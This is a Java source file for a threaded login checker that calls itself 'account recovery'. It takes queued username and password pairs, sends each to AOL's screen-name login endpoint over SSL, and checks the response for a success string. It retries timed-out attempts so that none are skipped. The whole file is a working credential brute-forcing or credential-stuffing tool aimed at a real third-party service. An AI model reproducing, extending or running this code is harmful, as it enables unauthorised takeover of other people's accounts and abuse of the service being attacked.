/*
 * @(#)RecoveryThread.java   09/04/08
 * 
 * Copyright (c) 2007 312c
 *
 */



package C4;

//~--- JDK imports ------------------------------------------------------------

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.Writer;

import java.net.URLEncoder;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.swing.JOptionPane;

//~--- classes ----------------------------------------------------------------

/**
 * Thread used to make recovery attempts
 *
 */
public class RecoveryThread extends Thread
{
    private double         attempts = 0;
    final SSLSocketFactory factory  =
        (SSLSocketFactory) SSLSocketFactory.getDefault();
    Writer                 out    = null;
    private SSLSocket      socket = null;
    private Queue<Account> sourceQueue;
    private boolean        running = true;
    private boolean        paused  = false;
    private int            configLine;
    private String         configString;
    private AR_v4          owner;

    //~--- constructors -------------------------------------------------------

    /**
     * Constructs a new thread for account recovery
     *
     *
     *
     * @param owner Owner of the thread
     * @param configLine How many lines to read into the server's response to an attempt
     * @param configString What to check for in the server's response
     * @param sourceQueue Queue containing accounts to attempt to recover
     */
    public RecoveryThread(AR_v4 owner, int configLine, String configString,
                          Queue<Account> sourceQueue)
    {
        this.owner        = owner;
        this.sourceQueue  = sourceQueue;
        this.configLine   = configLine;
        this.configString = configString;
    }

    //~--- methods ------------------------------------------------------------

    /**
     * Runs the thread
     *
     */
    public void run()
    {
        try
        {
            // Runs while recovery is started and
            // the queue is not empty
            while (running &&!sourceQueue.isEmpty())
            {
                Account cur      = sourceQueue.dequeue();
                boolean success  = false;
                boolean timedOut = true;

                // On an error or the socket timing out the attempt
                // is retried, hence preventing "skipping" of attempts
                while (timedOut && running)
                {
                    try
                    {
                        // Creates a new SSL connection
                        socket = (SSLSocket) factory.createSocket(
                            "my.screenname.aol.com", 443);

                        // Writes data to the server
                        out = new OutputStreamWriter(socket.getOutputStream());
                        out.write("GET /_cqr/login/login.psp?"+"screenname=" + cur.getUsername() + "&password="
                                + URLEncoder.encode(cur.getPassword(), "UTF-8")
                                + "&submitSwitch=1&siteId=loginDotCompuServe&mcState=initialized"+" HTTP/1.1\r\n");
                        out.write("Host: my.screenname.aol.com:443\r\n");
                        out.write(
                            "Referer: https://my.screenname.aol.com/_cqr/login/login.psp\r\n");
                        /*out.write(
                            "Content-Type: application/x-www-form-urlencoded\r\n");

                        String content =
                            "screenname=" + cur.getUsername() + "&password="
                            + URLEncoder.encode(cur.getPassword(), "UTF-8")
                            + "&submitSwitch=1&siteId=loginDotCompuServe&mcState=initialized";

                        out.write("Content-Length: " + content.length()
                                  + "\r\n\r\n");
                        out.write(content);*/
                        out.write("\r\n");
                        out.flush();

                        // Reads data back from the server
                        final BufferedReader in =
                            new BufferedReader(
                                new InputStreamReader(
                                    socket.getInputStream()));
                        String fromServer = in.readLine();

                        for (int j = 0; j < configLine; j++)
                        {
                        	System.out.println(""+j+"-"+fromServer);
                            fromServer = in.readLine();
                        }
                        System.out.println(configLine+"-"+fromServer);
                        // Checks for a String that shows a valid attempt
                        success = fromServer.indexOf(configString) != -1;

                        // Closes the socket
                        socket.close();
                        attempts++;
                        timedOut = false;
                    }
                    catch (Exception e)
                    {
                        e.printStackTrace();
                    }

                    while (paused &&!success && running)
                    {
                        try
                        {
                            Thread.sleep(100);
                        }
                        catch (Exception e)
                        {
                            e.printStackTrace();
                        }
                    }
                }

                owner.updateStats(cur, success);
            }
        }
        catch (final Exception g)
        {
            g.printStackTrace();
        }
    }

    /**
     * Stops the thread
     *
     */
    public void stopRunning()
    {
        running = false;
    }

    //~--- get methods --------------------------------------------------------

    /**
     * Returns the number of attempts made by this thread
     *
     *
     * @return The number of attempts made
     */
    public double getAttempts()
    {
        return attempts;
    }

    //~--- set methods --------------------------------------------------------

    /**
     * Toggles the pause state of the thread
     *
     *
     * @param paused The pause state
     */
    public void setPaused(boolean paused)
    {
        this.paused = paused;
    }
}
